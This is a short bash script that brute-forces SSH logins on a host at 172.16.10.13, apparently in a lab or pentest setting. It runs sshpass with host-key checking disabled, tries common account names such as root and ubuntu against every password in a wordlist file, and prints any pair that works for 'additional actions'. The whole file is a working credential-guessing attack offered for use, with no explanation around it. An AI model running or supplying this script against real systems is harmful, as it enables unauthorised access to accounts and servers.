#!/bin/bash

# Define the target SSH server and port
TARGET="172.16.10.13"
PORT="22"

# Define the username and password lists
USERNAMES=("root" "guest" "backup" "ubuntu" "centos")
PASSWORD_FILE="passwords.txt"

echo "Starting SSH credential testing..."

# Loop through each combination of usernames and passwords
for user in "${USERNAMES[@]}"; do
  while IFS= read -r pass; do
    echo "Testing credentials: ${user} / ${pass}"

    # Check the exit code to determine if the login was successful
    if sshpass -p "${pass}" ssh -o "StrictHostKeyChecking=no" \
               -p "${PORT}" "${user}@${TARGET}" exit >/dev/null 2>&1; then
      echo "Successful login with credentials:"
      echo "Host: ${TARGET}"
      echo "Username: ${user}"
      echo "Password: ${pass}"

      # Perform additional actions here using the credentials
      exit 0
    fi
  done < "${PASSWORD_FILE}"
done

echo "No valid credentials found."
